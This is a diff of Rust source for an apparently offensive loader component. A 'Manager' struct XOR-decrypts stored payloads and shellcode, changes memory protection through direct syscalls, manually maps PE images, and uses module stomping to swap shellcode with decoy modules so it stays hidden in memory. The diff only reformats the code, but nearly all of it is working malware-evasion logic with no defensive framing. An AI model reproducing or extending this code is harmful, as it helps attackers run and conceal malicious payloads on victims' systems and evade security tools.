@@ -31,8 +31,7 @@ impl Manager {
 
     pub fn new_module (&mut self, address: usize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
     {   
-        if self.payloads.contains_key(&address)
-        {
+        if self.payloads.contains_key(&address) {
             return Err(lc!("[x] This address is already mapped."));
         }
 
@@ -48,8 +47,7 @@ impl Manager {
 
             let mut xor_key: u8 = *key_ptr;
             key_ptr = key_ptr.add(1);
-            while *key_ptr != '\0' as u8
-            {
+            while *key_ptr != '\0' as u8 {
                 xor_key = xor_key ^ *key_ptr;
                 key_ptr = key_ptr.add(1);
             }
@@ -73,8 +71,7 @@ impl Manager {
 
     pub fn new_shellcode (&mut self, address: usize, payload: Vec<u8>, decoy: Vec<u8>) -> Result<(), String>
     {   
-        if self.payloads.contains_key(&address)
-        {
+        if self.payloads.contains_key(&address) {
             return Err(lc!("[x] This shellcode is already mapped."));
         }
 
@@ -87,8 +84,7 @@ impl Manager {
 
             let mut xor_key: u8 = *key_ptr;
             key_ptr = key_ptr.add(1);
-            while *key_ptr != '\0' as u8
-            {
+            while *key_ptr != '\0' as u8 {
                 xor_key = xor_key ^ *key_ptr;
                 key_ptr = key_ptr.add(1);
             }
@@ -115,8 +111,7 @@ impl Manager {
             let mut module_ptr = module.as_ptr();
             let mut final_module: Vec<u8> = vec![];
 
-            for _i in 0..module.len()
-            {
+            for _i in 0..module.len() {
                 final_module.push(*module_ptr ^ key);
                 module_ptr = module_ptr.add(1);
             }
@@ -139,27 +134,21 @@ impl Manager {
                     let decoy_info = self.decoys_metadata.get(&address).unwrap();
                     
                     let addr: PVOID = std::mem::transmute(address);
-                    let handle = HANDLE {0: -1};
+                    let handle = HANDLE {0: -1 as _};
                     let base_address: *mut PVOID = std::mem::transmute(&address);
                     let s: UnsafeCell<i64> = i64::default().into();
                     let size: *mut usize = std::mem::transmute(s.get());
                     
-                    if decoy_info.is_32_bit
-                    {
+                    if decoy_info.is_32_bit {
                         *size = decoy_info.opt_header_32.SizeOfImage as usize;
-                    }
-                    else 
-                    {
+                    } else {
                         *size = decoy_info.opt_header_64.size_of_image as usize;
                     }
-
 
                     let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                     let ret = dinvoke::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
                     
-
-                    if ret != 0
-                    {
+                    if ret != 0 {
                         return Err(lc!("[x] Error changing memory protection."));
                     }
 
@@ -168,14 +157,12 @@ impl Manager {
                     let _r = manualmap::map_to_allocated_memory(decrypted_payload.as_ptr(), addr, pe_info)?;
                     let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
                     
-                    for i in 0..decrypted_payload.len()
-                    {
+                    for i in 0..decrypted_payload.len() {
                         *(decrypted_payload_ptr.add(i)) = 0u8;
                     }
                 } 
 
                 self.counter.insert(address, self.counter[&address] + 1);
-
             }
 
             Ok(())
@@ -196,36 +183,29 @@ impl Manager {
                     let pe_info = self.decoys_metadata.get(&address).unwrap();
                     let addr: PVOID = std::mem::transmute(address);
     
-                    let handle = HANDLE {0: -1};
+                    let handle = HANDLE {0: -1 as _};
                     let base_address: *mut PVOID = std::mem::transmute(&address);
                     let s: UnsafeCell<usize> = usize::default().into();
                     let size: *mut usize = std::mem::transmute(s.get());
                     
-                    if pe_info.is_32_bit
-                    {
+                    if pe_info.is_32_bit {
                         *size = pe_info.opt_header_32.SizeOfImage as usize;
-                    }
-                    else 
-                    {
+                    } else {
                         *size = pe_info.opt_header_64.size_of_image as usize;
                     }
-
 
                     let old_protection: *mut u32 = std::mem::transmute(&u32::default());
                     let ret = dinvoke::nt_protect_virtual_memory(handle, base_address, size, PAGE_READWRITE, old_protection);
                     dinvoke::rtl_zero_memory(*base_address, *size);
 
-                    if ret != 0
-                    {
+                    if ret != 0 {
                         return Err(lc!("[x] Error changing memory protection."));
                     }
 
                     let _r = manualmap::map_to_allocated_memory(decrypted_decoy.as_ptr(), addr, pe_info)?;
                 } 
 
-
-                if self.counter.get(&address).unwrap() >= &1
-                {
+                if self.counter.get(&address).unwrap() >= &1 {
                     self.counter.insert(address, self.counter[&address] - 1);
                 }
 
@@ -246,21 +226,17 @@ impl Manager {
                 let decrypted_decoy = Manager::xor_module(decoy.to_vec(), key);    
                 let result = overload::managed_module_stomping(&decrypted_decoy, address, 0);
 
-                if !result.is_ok()
-                {
+                if !result.is_ok() {
                     return Err(lc!("[x] Error hiding shellcode."));
                 }
             } 
 
-            if self.counter.get(&address).unwrap() >= &1
-            {
+            if self.counter.get(&address).unwrap() >= &1 {
                 self.counter.insert(address, self.counter[&address] - 1);
             }
-
         }
 
         Ok(())
-        
     }
 
     pub fn stomp_shellcode(&mut self, address: usize) -> Result<(),String>
@@ -274,27 +250,21 @@ impl Manager {
                 let mut decrypted_payload = Manager::xor_module(payload.to_vec(), key);
                 let result = overload::managed_module_stomping(&decrypted_payload, address, 0);
                 let decrypted_payload_ptr = decrypted_payload.as_mut_ptr();
-                unsafe
-                {
-                    for i in 0..decrypted_payload.len()
-                    {
+                unsafe {
+                    for i in 0..decrypted_payload.len() {
                         *(decrypted_payload_ptr.add(i)) = 0u8;
                     }
                 }
 
-                if !result.is_ok()
-                {
+                if !result.is_ok() {
                     return Err(lc!("[x] Error stomping shellcode."));
                 }
-
             } 
 
             self.counter.insert(address, self.counter[&address] + 1);
-
         }
 
         Ok(())
-        
     }
 
 }
